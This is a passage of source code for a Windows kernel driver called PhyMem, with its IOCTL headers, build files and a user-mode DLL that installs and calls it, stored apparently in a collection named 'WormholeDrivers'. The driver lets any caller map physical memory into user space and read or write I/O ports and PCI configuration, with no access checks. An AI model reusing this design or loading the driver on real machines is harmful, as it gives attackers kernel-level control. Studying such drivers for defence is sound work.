	pPci=(PPHYMEM_PCI)pSysBuf;
	dwInBufLen=irpStack->Parameters.DeviceIoControl.InputBufferLength;
	dwOutBufLen=irpStack->Parameters.DeviceIoControl.OutputBufferLength;

	switch (irpStack->MajorFunction)
	{
	case IRP_MJ_DEVICE_CONTROL:

		dwIoCtlCode=irpStack->Parameters.DeviceIoControl.IoControlCode;

		switch (dwIoCtlCode)
		{
		case IOCTL_PHYMEM_MAP:

			if (dwInBufLen==sizeof(PHYMEM_MEM) && dwOutBufLen==sizeof(PVOID))
			{
				PHYSICAL_ADDRESS phyAddr;
				PVOID pvk, pvu;

				phyAddr.QuadPart=(ULONGLONG)pMem->pvAddr;

				//get mapped kernel address
				pvk=MmMapIoSpace(phyAddr, pMem->dwSize, MmNonCached);

				if (pvk)
				{
					//allocate mdl for the mapped kernel address
					PMDL pMdl=IoAllocateMdl(pvk, pMem->dwSize, FALSE, FALSE, NULL);
					if (pMdl)
					{
						PMAPINFO pMapInfo;

						//build mdl and map to user space
						MmBuildMdlForNonPagedPool(pMdl);
						pvu=MmMapLockedPages(pMdl, UserMode);

						//insert mapped infomation to list
						pMapInfo=(PMAPINFO)ExAllocatePool(\
							NonPagedPool, sizeof(MAPINFO));
						pMapInfo->pMdl=pMdl;
						pMapInfo->pvk=pvk;
						pMapInfo->pvu=pvu;
						pMapInfo->memSize=pMem->dwSize;
						PushEntryList(&lstMapInfo, &pMapInfo->link);

						DebugPrint("Map physical 0x%x to virtual 0x%x, size %u", \
							pMem->pvAddr, pvu, pMem->dwSize);

						RtlCopyMemory(pSysBuf, &pvu, sizeof(PVOID));

						irp->IoStatus.Information=sizeof(PVOID);
					}
					else
					{
						//allocate mdl error, unmap the mapped physical memory
						MmUnmapIoSpace(pvk, pMem->dwSize);

						irp->IoStatus.Status=STATUS_INSUFFICIENT_RESOURCES;
					}
				}
				else
					irp->IoStatus.Status=STATUS_INSUFFICIENT_RESOURCES;
			}
			else
				irp->IoStatus.Status=STATUS_INVALID_PARAMETER;

			break;

	    case IOCTL_PHYMEM_UNMAP:

			DebugPrintMsg("IOCTL_PHYMEM_UNMAP");

			if (dwInBufLen==sizeof(PHYMEM_MEM))
			{
				PMAPINFO pMapInfo;
				PSINGLE_LIST_ENTRY pLink, pPrevLink;

				//initialize to head
				pPrevLink=pLink=lstMapInfo.Next;
				while(pLink)
				{
					pMapInfo=CONTAINING_RECORD(pLink, MAPINFO, link);

					if (pMapInfo->pvu==pMem->pvAddr)
					{
						if (pMapInfo->memSize==pMem->dwSize)
						{
							//free mdl, unmap mapped memory
							MmUnmapLockedPages(pMapInfo->pvu, pMapInfo->pMdl); 
							IoFreeMdl(pMapInfo->pMdl);
							MmUnmapIoSpace(pMapInfo->pvk, pMapInfo->memSize);

							DebugPrint("Unmap virtual address 0x%x, size %u",\
								pMapInfo->pvu, pMapInfo->memSize);

							//delete matched element from the list
							if (pLink==lstMapInfo.Next)
								lstMapInfo.Next=pLink->Next;	//delete head elememt
							else
								pPrevLink->Next=pLink->Next;

							ExFreePool(pMapInfo);
						}
						else
							irp->IoStatus.Status=STATUS_INVALID_PARAMETER;

						break;
					}

					pPrevLink=pLink;
					pLink=pLink->Next;
				}
			}
			else
				irp->IoStatus.Status=STATUS_INVALID_PARAMETER;

			break;

		case IOCTL_PHYMEM_GETPORT:

			DebugPrintMsg("IOCTL_PHYMEM_GETPORT");

			if (dwInBufLen==sizeof(PHYMEM_PORT) && dwOutBufLen==sizeof(ULONG))
			{
				irp->IoStatus.Information=sizeof(ULONG);

				if (pPort->dwSize==1)
				{
					*(PULONG)pSysBuf=(ULONG)READ_PORT_UCHAR((PUCHAR)pPort->dwPort);
				}
				else if (pPort->dwSize==2)
				{
					*(PULONG)pSysBuf=(ULONG)READ_PORT_USHORT((PUSHORT)pPort->dwPort);
				}
				else if (pPort->dwSize==4)
				{
					*(PULONG)pSysBuf=READ_PORT_ULONG((PULONG)pPort->dwPort);
				}
				else
					irp->IoStatus.Status=STATUS_INVALID_PARAMETER;
			}
			else
				irp->IoStatus.Status=STATUS_INVALID_PARAMETER;

			break;

		case IOCTL_PHYMEM_SETPORT:

			DebugPrintMsg("IOCTL_PHYMEM_SETPORT");

			if (dwInBufLen==sizeof(PHYMEM_PORT))
			{
				if (pPort->dwSize==1)
				{
					WRITE_PORT_UCHAR((PUCHAR)pPort->dwPort, (UCHAR)pPort->dwValue);
				}
				else if (pPort->dwSize==2)
				{
					WRITE_PORT_USHORT((PUSHORT)pPort->dwPort, (USHORT)pPort->dwValue);
				}
				else if (pPort->dwSize==4)
				{
					WRITE_PORT_ULONG((PULONG)pPort->dwPort, pPort->dwValue);
				}
				else
					irp->IoStatus.Status=STATUS_INVALID_PARAMETER;
			}
			else
				irp->IoStatus.Status=STATUS_INVALID_PARAMETER;

			break;

		case IOCTL_PHYMEM_GETPCI:

			DebugPrintMsg("IOCTL_PHYMEM_GETPCI");

			//register offset + bytes to read cannnot exceed 256(pci config space limit)
			if (dwInBufLen==sizeof(PHYMEM_PCI) &&
				((pPci->dwRegOff + pPci->dwBytes)<=256) && (dwOutBufLen>=pPci->dwBytes))
			{
				irp->IoStatus.Status=ReadWriteConfig(irp, pPci, TRUE);

				if (NT_SUCCESS(irp->IoStatus.Status))
				{
					irp->IoStatus.Information=pPci->dwBytes;
				}
			}
			else
				irp->IoStatus.Status=STATUS_INVALID_PARAMETER;

			break;

		case IOCTL_PHYMEM_SETPCI:

			DebugPrintMsg("IOCTL_PHYMEM_SETPCI");

			//register offset + bytes to write cannnot exceed 256(pci config space limit)
			//new values to write are stored in out buffer(strange but it works)
			if (dwInBufLen==sizeof(PHYMEM_PCI) &&
				((pPci->dwRegOff + pPci->dwBytes)<=256) && (dwOutBufLen>=pPci->dwBytes))
			{
				irp->IoStatus.Status=ReadWriteConfig(irp, pPci, FALSE);

				if (NT_SUCCESS(irp->IoStatus.Status))
				{
					irp->IoStatus.Information=pPci->dwBytes;
				}
			}
			else
				irp->IoStatus.Status=STATUS_INVALID_PARAMETER;

			break;

		default:

			DebugPrintMsg("Error: Unknown IO CONTROL CODE");

			break;
		}

		break;
	}

	ntStatus=irp->IoStatus.Status;

	IoCompleteRequest(irp, IO_NO_INCREMENT);

	DebugPrintMsg("Leaving PhyMemIoCtl");

	return ntStatus;
}

/*++
Driver Unload routine
--*/
VOID PhyMemUnload(IN PDRIVER_OBJECT dro)
{
	UNICODE_STRING DeviceLinkU;
	NTSTATUS ntStatus;
	PMAPINFO pMapInfo;
	PSINGLE_LIST_ENTRY pLink;

	DebugPrintMsg("Entering PhyMemUnload");

	//free resources
	pLink=PopEntryList(&lstMapInfo);
	while(pLink)
	{
		pMapInfo=CONTAINING_RECORD(pLink, MAPINFO, link);

		MmUnmapLockedPages(pMapInfo->pvu, pMapInfo->pMdl); 
		IoFreeMdl(pMapInfo->pMdl);
		MmUnmapIoSpace(pMapInfo->pvk, pMapInfo->memSize);

		ExFreePool(pMapInfo);

		pLink=PopEntryList(&lstMapInfo);
	}

	if (busInterface && busInterface->InterfaceDereference)
	{
		(*busInterface->InterfaceDereference)(busInterface->Context);

		ExFreePool(busInterface);
	}

	RtlInitUnicodeString(&DeviceLinkU, L"\\DosDevices\\PhyMem");

	ntStatus=IoDeleteSymbolicLink(&DeviceLinkU);

	if (NT_SUCCESS(ntStatus))
	{
		IoDeleteDevice(dro->DeviceObject);
	}
	else
	{
		DebugPrintMsg("Error: IoDeleteSymbolicLink failed");
	}

	DebugPrintMsg("Leaving PhyMemUnload");

	DebugPrintClose();
}

//prepare to get bus interface
static NTSTATUS PreGetBus()
{
	NTSTATUS ntStatus;
	UNICODE_STRING pcifidoNameU;

	ntStatus=STATUS_SUCCESS;

	//get pci filter driver do
	if (pcifido==NULL)
	{
		RtlInitUnicodeString(&pcifidoNameU, L"\\Device\\PhyMemPCIFilter");

		ntStatus=IoGetDeviceObjectPointer(&pcifidoNameU,
										  FILE_READ_DATA|FILE_WRITE_DATA,
										  &pcifo,
										  &pcifido);

		if (NT_SUCCESS(ntStatus))
		{
			DebugPrint("Got pci filter device object: 0x%x", pcifido);
		}
		else
		{
			DebugPrint("Get pci filter device object failed, code=0x%x", ntStatus);

			return STATUS_UNSUCCESSFUL;
		}
	}

	//get bus interface
	if (busInterface->ReadConfig==NULL)
	{
		ntStatus=GetBusInterface(pcifido, busInterface);

		if (NT_SUCCESS(ntStatus))
		{
			DebugPrint("Got pci bus filter driver interface");
		}
		else
		{
			DebugPrint("Get pci bus driver interface failed, code=0x%x", ntStatus);
		}
	}

	return ntStatus;
}

//read pci configuration
static NTSTATUS ReadWriteConfig(PIRP irp, PPHYMEM_PCI pPci, BOOLEAN isRead)
{
	NTSTATUS ntStatus;

	//get pci filter driver interface
	ntStatus=PreGetBus();

	if (NT_SUCCESS(ntStatus))
	{
		PVOID pValue;

		//get out buffer kernel address
		pValue=(PVOID)MmGetSystemAddressForMdlSafe(irp->MdlAddress,
			NormalPagePriority);

		if (pValue)
		{
			PCI_SLOT_NUMBER slot;
			ULONG ulRet;

			slot.u.AsULONG=0;
			slot.u.bits.DeviceNumber=pPci->dwDevNum;
			slot.u.bits.FunctionNumber=pPci->dwFuncNum;

			if (isRead)
				ulRet=(*busInterface->ReadConfig)(busInterface->Context,	//context
												  (UCHAR)pPci->dwBusNum,	//busoffset
												  slot.u.AsULONG,			//slot
												  pValue,					//buffer
												  pPci->dwRegOff,			//offset
												  pPci->dwBytes);			//length

			else
				ulRet=(*busInterface->WriteConfig)(busInterface->Context,	//context
												   (UCHAR)pPci->dwBusNum,	//busoffset
												   slot.u.AsULONG,			//slot
												   pValue,					//buffer
												   pPci->dwRegOff,			//offset
												   pPci->dwBytes);			//length

			if (ulRet==pPci->dwBytes)
			{
				ntStatus=STATUS_SUCCESS;

				if (isRead)
					DebugPrint("Read %d bytes from pci config space", ulRet);
				else
					DebugPrint("Write %d bytes to pci config space", ulRet);
			}
			else
				ntStatus=STATUS_UNSUCCESSFUL;
		}
		else
			ntStatus=STATUS_INVALID_PARAMETER;
	}

	return ntStatus;
}
```

`source/WormholeDrivers/PHYMEM/PhyMem/driver/phymem.dsp`:

```dsp
# Microsoft Developer Studio Project File - Name="phymem" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=phymem - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "phymem.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "phymem.mak" CFG="phymem - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "phymem - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "phymem - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "phymem - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /Gz /W3 /Zi /Oi /I "$(DDKROOT)\inc\wxp" /I "$(DDKROOT)\inc\ddk\wxp" /I "$(DDKROOT)\inc\ddk\wdm\wxp" /I "$(DDKROOT)\inc\crt" /I "$(DDKROOT)\inc\crt\gl" /I "$(DDKROOT)\inc\crt\sys" /D "WIN32" /D "NDEBUG" /D "_X86_" /D DBG=0 /D _WIN32_WINNT=0x0501 /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386 /out:"Release/phymem.sys"
# ADD LINK32 wdm.lib /nologo /base:"0x10000" /stack:0x40000,0x1000 /entry:"DriverEntry" /machine:I386 /nodefaultlib /out:"../Release/phymem.sys" /libpath:"$(DDKROOT)\lib\wxp\i386" /subsystem:NATIVE,5.1 /driver /IGNORE:4078 /RELEASE
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "phymem - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD CPP /nologo /Gz /W3 /Zi /Oi /I "$(DDKROOT)\inc\wxp" /I "$(DDKROOT)\inc\ddk\wxp" /I "$(DDKROOT)\inc\ddk\wdm\wxp" /I "$(DDKROOT)\inc\crt" /I "$(DDKROOT)\inc\crt\gl" /I "$(DDKROOT)\inc\crt\sys" /D "WIN32" /D "_DEBUG" /D "_X86_" /D DBG=1 /D _WIN32_WINNT=0x0501 /YX /FD /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /out:"Debug/phymem.sys" /pdbtype:sept
# ADD LINK32 wdm.lib /nologo /base:"0x10000" /stack:0x40000,0x1000 /entry:"DriverEntry" /incremental:no /debug /machine:I386 /nodefaultlib /out:"../Debug/phymem.sys" /libpath:"$(DDKROOT)\lib\wxp\i386" /subsystem:NATIVE,5.1 /driver /IGNORE:4078

!ENDIF 

# Begin Target

# Name "phymem - Win32 Release"
# Name "phymem - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\AccessBus.c
# End Source File
# Begin Source File

SOURCE=.\DebugPrint.c
# End Source File
# Begin Source File

SOURCE=.\phymem.c
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\DebugPrint.h
# End Source File
# Begin Source File

SOURCE=.\phymem.h
# End Source File
# End Group
# Begin Group "Resource Files"

# PROP Default_Filter "ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe"
# End Group
# End Target
# End Project

```

`source/WormholeDrivers/PHYMEM/PhyMem/driver/phymem.dsw`:

```dsw
Microsoft Developer Studio Workspace File, Format Version 6.00
# WARNING: DO NOT EDIT OR DELETE THIS WORKSPACE FILE!

###############################################################################

Project: "phymem"=.\phymem.dsp - Package Owner=<4>

Package=<5>
{{{
}}}

Package=<4>
{{{
}}}

###############################################################################

Global:

Package=<5>
{{{
}}}

Package=<3>
{{{
}}}

###############################################################################


```

`source/WormholeDrivers/PHYMEM/PhyMem/driver/phymem.h`:

```h
#ifndef __PHYMEM_H
#define __PHYMEM_H

#define	FILE_DEVICE_PHYMEM	0x8000

#define IOCTL_PHYMEM_MAP	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x800,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PHYMEM_UNMAP	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x801,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_GETPORT	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x802,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_SETPORT	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x803,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_GETPCI	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x804,\
			 METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_SETPCI	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x805,\
			 METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

typedef struct tagPHYMEM_MEM
{
	PVOID pvAddr;	//physical addr when mapping, virtual addr when unmapping
	ULONG dwSize;	//memory size to map or unmap
} PHYMEM_MEM, *PPHYMEM_MEM;

typedef struct tagPHYMEM_PORT
{
	ULONG dwPort;	//port number: 0-0xFFFF
	ULONG dwSize;	//must be 1, 2, 4
	ULONG dwValue;	//new value to set
} PHYMEM_PORT, *PPHYMEM_PORT;

typedef struct tagPHYMEM_PCI
{
	ULONG dwBusNum;		//bus number: 0-255
	ULONG dwDevNum;		//device number: 0-31
	ULONG dwFuncNum;	//function number: 0-7
	ULONG dwRegOff;		//register offset: 0-255
	ULONG dwBytes;		//bytes to read or write
} PHYMEM_PCI, *PPHYMEM_PCI;

#endif	//__PHYMEM_H

```

`source/WormholeDrivers/PHYMEM/PhyMem/pmdll/initdrv.cpp`:

```cpp
/*++
Install and remove driver at runtime
--*/

#include <windows.h>

BOOL InstallDriver(PCSTR pszDriverPath, PCSTR pszDriverName);
BOOL RemoveDriver(PCSTR pszDriverName);
BOOL StartDriver(PCSTR pszDriverName);
BOOL StopDriver(PCSTR pszDriverName);

BOOL InstallDriver(PCSTR pszDriverPath, PCSTR pszDriverName)
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;

	//Remove any previous instance of the driver
	RemoveDriver(pszDriverName);

	hSCManager=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager)
	{
		//Install the driver
		hService=CreateService( hSCManager,
								pszDriverName,
								pszDriverName,
								SERVICE_ALL_ACCESS,
								SERVICE_KERNEL_DRIVER,
								SERVICE_DEMAND_START,
								SERVICE_ERROR_NORMAL,
								pszDriverPath,
								NULL,
								NULL,
								NULL,
								NULL,
								NULL);

		CloseServiceHandle(hSCManager);
	
		if (hService==NULL)
			return FALSE;
	}
	else
		return FALSE;

	CloseServiceHandle(hService);

	return TRUE;
}

BOOL RemoveDriver(PCSTR pszDriverName)
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	BOOL bResult;

	StopDriver(pszDriverName);

	hSCManager=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager)
	{
		hService=OpenService(hSCManager, pszDriverName, SERVICE_ALL_ACCESS);

		CloseServiceHandle(hSCManager);

		if (hService)
		{
			bResult=DeleteService(hService);

			CloseServiceHandle(hService);
		}
		else
			return FALSE;
	}
	else
		return FALSE;

	return bResult;
}

BOOL StartDriver(PCSTR pszDriverName)
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	BOOL bResult;

	hSCManager=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager)
	{
		hService=OpenService(hSCManager, pszDriverName, SERVICE_ALL_ACCESS);

		CloseServiceHandle(hSCManager);

		if (hService)
		{
			bResult=StartService(hService, 0, NULL);
			if (bResult==FALSE)
			{
				if (GetLastError()==ERROR_SERVICE_ALREADY_RUNNING)
					bResult=TRUE;
			}

			CloseServiceHandle(hService);
		}
		else
			return FALSE;
	}
	else
		return FALSE;

	return bResult;
}

BOOL StopDriver(PCSTR pszDriverName)
{
	SC_HANDLE hSCManager;
	SC_HANDLE hService;
	SERVICE_STATUS ServiceStatus;
	BOOL bResult;

	hSCManager=OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

	if (hSCManager)
	{
		hService=OpenService(hSCManager, pszDriverName, SERVICE_ALL_ACCESS);

		CloseServiceHandle(hSCManager);

		if (hService)
		{
			bResult=ControlService(hService, SERVICE_CONTROL_STOP, &ServiceStatus);

			CloseServiceHandle(hService);
		}
		else
			return FALSE;
	}
	else
		return FALSE;

	return bResult;
}

```

`source/WormholeDrivers/PHYMEM/PhyMem/pmdll/phymem.h`:

```h
#ifndef __PHYMEM_H
#define __PHYMEM_H

#define	FILE_DEVICE_PHYMEM	0x8000

#define IOCTL_PHYMEM_MAP	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x800,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define IOCTL_PHYMEM_UNMAP	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x801,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_GETPORT	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x802,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_SETPORT	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x803,\
			 METHOD_BUFFERED, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_GETPCI	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x804,\
			 METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

#define	IOCTL_PHYMEM_SETPCI	\
	CTL_CODE(FILE_DEVICE_PHYMEM, 0x805,\
			 METHOD_OUT_DIRECT, FILE_ANY_ACCESS)

typedef struct tagPHYMEM_MEM
{
	PVOID pvAddr;	//physical addr when mapping, virtual addr when unmapping
	ULONG dwSize;	//memory size to map or unmap
} PHYMEM_MEM, *PPHYMEM_MEM;

typedef struct tagPHYMEM_PORT
{
	ULONG dwPort;	//port number: 0-0xFFFF
	ULONG dwSize;	//must be 1, 2, 4
	ULONG dwValue;	//new value to set
} PHYMEM_PORT, *PPHYMEM_PORT;

typedef struct tagPHYMEM_PCI
{
	ULONG dwBusNum;		//bus number: 0-255
	ULONG dwDevNum;		//device number: 0-31
	ULONG dwFuncNum;	//function number: 0-7
	ULONG dwRegOff;		//register offset: 0-255
	ULONG dwBytes;		//bytes to read or write
} PHYMEM_PCI, *PPHYMEM_PCI;

#endif	//__PHYMEM_H

```

`source/WormholeDrivers/PHYMEM/PhyMem/pmdll/pmdll.cpp`:

```cpp
/*++
PhyMem Driver
Ver: 1.0
Author: akui
Date: 2009/3/5
--*/

#include <windows.h>
#include <winioctl.h>
#include "pmdll.h"
#include "phymem.h"

HANDLE hDriver=INVALID_HANDLE_VALUE;

BOOL InstallDriver(PCSTR pszDriverPath, PCSTR pszDriverName);
BOOL RemoveDriver(PCSTR pszDriverName);
BOOL StartDriver(PCSTR pszDriverName);
BOOL StopDriver(PCSTR pszDriverName);

//get driver(phymem.sys) full path
static BOOL GetDriverPath(PSTR szDriverPath)
{
	PSTR pszSlash;

	if (!GetModuleFileName(GetModuleHandle(NULL), szDriverPath, MAX_PATH))
		return FALSE;

	pszSlash=strrchr(szDriverPath, '\\');

	if (pszSlash)
		pszSlash[1]='\0';
	else
		return FALSE;

	return TRUE;
}

//install and start driver
BOOL LoadPhyMemDriver()
{
	BOOL bResult;
	CHAR szDriverPath[MAX_PATH];

	hDriver=CreateFile( "\\\\.\\PhyMem",
						GENERIC_READ|GENERIC_WRITE,
						0,
						NULL,
						OPEN_EXISTING,
						FILE_ATTRIBUTE_NORMAL,
						NULL);

	//If the driver is not running, install it
	if (hDriver==INVALID_HANDLE_VALUE)
	{
		GetDriverPath(szDriverPath);
		strcat(szDriverPath, "phymem.sys");

		bResult=InstallDriver(szDriverPath, "PHYMEM");

		if (!bResult)
			return FALSE;

		bResult=StartDriver("PHYMEM");

		if (!bResult)
			return FALSE;

		hDriver=CreateFile( "\\\\.\\PhyMem",
							GENERIC_READ | GENERIC_WRITE,
							0,
							NULL,
							OPEN_EXISTING,
							FILE_ATTRIBUTE_NORMAL,
							NULL);

		if (hDriver==INVALID_HANDLE_VALUE)
			return FALSE;
	}

	return TRUE;
}

//stop and remove driver
VOID UnloadPhyMemDriver()
{
	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		CloseHandle(hDriver);
		hDriver=INVALID_HANDLE_VALUE;
	}

	RemoveDriver("PHYMEM");
}

//map physical memory to user space
PVOID MapPhyMem(DWORD phyAddr, DWORD memSize)
{
	PVOID pVirAddr=NULL;	//mapped virtual addr
	PHYMEM_MEM pm;
	DWORD dwBytes=0;
	BOOL bRet=FALSE;

	pm.pvAddr=(PVOID)phyAddr;	//physical address
	pm.dwSize=memSize;	//memory size

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		bRet=DeviceIoControl(hDriver, IOCTL_PHYMEM_MAP, &pm,
			sizeof(PHYMEM_MEM), &pVirAddr, sizeof(PVOID), &dwBytes, NULL);
	}

	if (bRet && dwBytes==sizeof(PVOID))
		return pVirAddr;
	else
		return NULL;
}

//unmap memory
VOID UnmapPhyMem(PVOID pVirAddr, DWORD memSize)
{
	PHYMEM_MEM pm;
	DWORD dwBytes=0;

	pm.pvAddr=pVirAddr;	//virtual address
	pm.dwSize=memSize;	//memory size

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		DeviceIoControl(hDriver, IOCTL_PHYMEM_UNMAP, &pm,
			sizeof(PHYMEM_MEM), NULL, 0, &dwBytes, NULL);
	}
}

//read 1 byte from port
BYTE ReadPortByte(WORD portAddr)
{
	PHYMEM_PORT pp;
	DWORD pv=0;	//returned port value
	DWORD dwBytes;

	pp.dwPort=portAddr;
	pp.dwSize=1;	//1 byte

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		DeviceIoControl(hDriver, IOCTL_PHYMEM_GETPORT, &pp,
			sizeof(PHYMEM_PORT), &pv, sizeof(DWORD), &dwBytes, NULL);
	}

	return (BYTE)pv;
}

//read 2 bytes from port
WORD ReadPortWord(WORD portAddr)
{
	PHYMEM_PORT pp;
	DWORD pv=0;	//returned port value
	DWORD dwBytes;

	pp.dwPort=portAddr;
	pp.dwSize=2;	//2 bytes

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		DeviceIoControl(hDriver, IOCTL_PHYMEM_GETPORT, &pp,
			sizeof(PHYMEM_PORT), &pv, sizeof(DWORD), &dwBytes, NULL);
	}

	return (WORD)pv;
}

//read 4 bytes from port
DWORD ReadPortLong(WORD portAddr)
{
	PHYMEM_PORT pp;
	DWORD pv=0;	//returned port value
	DWORD dwBytes;

	pp.dwPort=portAddr;
	pp.dwSize=4;	//4 bytes

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		DeviceIoControl(hDriver, IOCTL_PHYMEM_GETPORT, &pp,
			sizeof(PHYMEM_PORT), &pv, sizeof(DWORD), &dwBytes, NULL);
	}

	return pv;
}

//write 1 byte to port
VOID WritePortByte(WORD portAddr, BYTE portValue)
{
	PHYMEM_PORT pp;
	DWORD dwBytes;

	pp.dwPort=portAddr;
	pp.dwValue=portValue;
	pp.dwSize=1;	//1 byte

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		DeviceIoControl(hDriver, IOCTL_PHYMEM_SETPORT, &pp,
			sizeof(PHYMEM_PORT), NULL, 0, &dwBytes, NULL);
	}
}

//write 2 bytes to port
VOID WritePortWord(WORD portAddr, WORD portValue)
{
	PHYMEM_PORT pp;
	DWORD dwBytes;

	pp.dwPort=portAddr;
	pp.dwValue=portValue;
	pp.dwSize=2;	//2 bytes

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		DeviceIoControl(hDriver, IOCTL_PHYMEM_SETPORT, &pp,
			sizeof(PHYMEM_PORT), NULL, 0, &dwBytes, NULL);
	}
}

//write 4 bytes to port
VOID WritePortLong(WORD portAddr, DWORD portValue)
{
	PHYMEM_PORT pp;
	DWORD dwBytes;

	pp.dwPort=portAddr;
	pp.dwValue=portValue;
	pp.dwSize=4;	//4 bytes

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		DeviceIoControl(hDriver, IOCTL_PHYMEM_SETPORT, &pp,
			sizeof(PHYMEM_PORT), NULL, 0, &dwBytes, NULL);
	}
}

//read pci configuration
BOOL ReadPCI(DWORD busNum, DWORD devNum, DWORD funcNum,
			 DWORD regOff, DWORD bytes, PVOID pValue)
{
	BOOL bRet=FALSE;
	DWORD dwBytes;
	PHYMEM_PCI pp;

	pp.dwBusNum=busNum;
	pp.dwDevNum=devNum;
	pp.dwFuncNum=funcNum;
	pp.dwRegOff=regOff;
	pp.dwBytes=bytes;
//	pp.pValue=NULL;

	if (hDriver!=INVALID_HANDLE_VALUE)
	{
		bRet=DeviceIoControl(hDriver, IOCTL_PHYMEM_GETPCI, &pp,
			sizeof(PHYMEM_PCI), pValue, bytes, &dwBytes, NULL);
	}

	if (bRet && dwBytes==bytes)
		return TRUE;
	else
		return FALSE;
}

//write pci configuration
